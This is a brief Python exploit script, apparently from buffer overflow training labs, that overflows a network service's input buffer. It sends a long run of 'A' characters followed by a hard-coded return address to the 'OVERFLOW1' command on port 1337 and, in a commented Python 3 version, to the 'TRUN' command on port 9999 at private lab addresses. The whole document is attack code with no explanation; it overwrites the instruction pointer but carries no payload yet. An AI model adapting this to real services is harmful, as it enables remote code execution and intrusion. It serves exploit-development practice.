#!/usr/bin/python2
import sys, socket

shellcode = "A" * 1978 + "\xaf\x11\x50\x62"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.10.171.225',1337))
	s.send(('OVERFLOW1 ' + shellcode))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()






""" Python 3
#!/usr/bin/python3

import sys, socket

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.14.10',9999))

	payload = "TRUN /.:/" + shellcode
	
	s.send((payload.encode()))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()
"""


